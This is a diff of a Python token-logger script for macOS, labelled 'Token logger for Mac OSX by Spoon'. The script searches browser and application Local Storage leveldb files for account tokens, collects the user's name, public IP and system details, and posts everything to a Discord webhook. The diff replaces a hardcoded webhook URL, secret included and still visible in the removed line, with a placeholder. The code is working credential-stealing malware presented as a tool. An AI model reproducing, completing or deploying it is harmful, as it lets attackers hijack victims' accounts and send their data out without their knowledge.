@@ -7,7 +7,7 @@ import getpass
 import platform
 import datetime
 
-WEBHOOK = "https://discord.com/api/webhooks/812572567059300362/376UJOXvz5qv9ikFVT0oX1aAB7fKiClyN9taqQIbf98P2slXZknio1zHPxGE4SAWVAZ1"
+WEBHOOK = "WEBHOOK URL HERE"
 
 
 appdatapath = (f'/Users/{getpass.getuser()}/Library/Application Support')
@@ -18,8 +18,6 @@ tknpaths = []
 def grabTokens(path):
 	tokns = []
 	appdatapath = os.getenv(f'/Users/{getpass.getuser()}/Library/Application Support')
-	
-
 	files = glob.glob(path + r"/Local Storage/leveldb/*.ldb")
 	files.extend(glob.glob(path + r"/Local Storage/leveldb/*.log"))
 	for file in files:
@@ -32,26 +30,20 @@ def grabTokens(path):
 				
 					tknpaths.append(tokenpath)
 					tokns.extend(tokenpath + possible)
-
 			except:
 				pass
-				
 	return tokns
-
 def SendTokensToWebhook(tkns):
 	ip = "Unavailable"
 	try:
 		ip = requests.get("http://checkip.amazonaws.com/").text
 	except:
 		ip = "Unavailable"
-
 	content = f"```ruby\nPulled {len(tkns) - len(tknpaths)} tokens from {getpass.getuser()} \nip: {ip}\n"
-
 	for tkn in tkns:
 		# content += '---------------------------------\n'
 		content += tkn + "\n"
 		content += '---------------------------------\n'
-
 	content += ("\n\n========================================System Information========================================")
 	uname = platform.uname()
 	content += (f"\nSystem: {uname.system}")
@@ -61,7 +53,6 @@ def SendTokensToWebhook(tkns):
 	content += (f"\nMachine: {uname.machine}")
 	content += (f"\nProcessor: {uname.processor}\n\n")
 	content += datetime.datetime.now().strftime("%H:%M %p")
-
 	content += "```@everyone"
 	payload = {
 	"content" : content,
@@ -69,16 +60,11 @@ def SendTokensToWebhook(tkns):
 	"username" : "Token logger for Mac OSX by Spoon"
 	}
 	requests.post(WEBHOOK, data=payload)
-
-
 tksn = []
 for _dir in paths:
 	tksn.extend(grabTokens(_dir))
-
-
 if len(tksn) < 1:
 	exit(0)
-
 for check in tksn:
 	check = str(check)
 	if check.startswith('\n'):
@@ -93,9 +79,4 @@ for check in tksn:
 		        continue
 		except:
 			pass
-
-
 SendTokensToWebhook(tksn) # Call the fucking function that sends the shit to the webhook
-
-
-
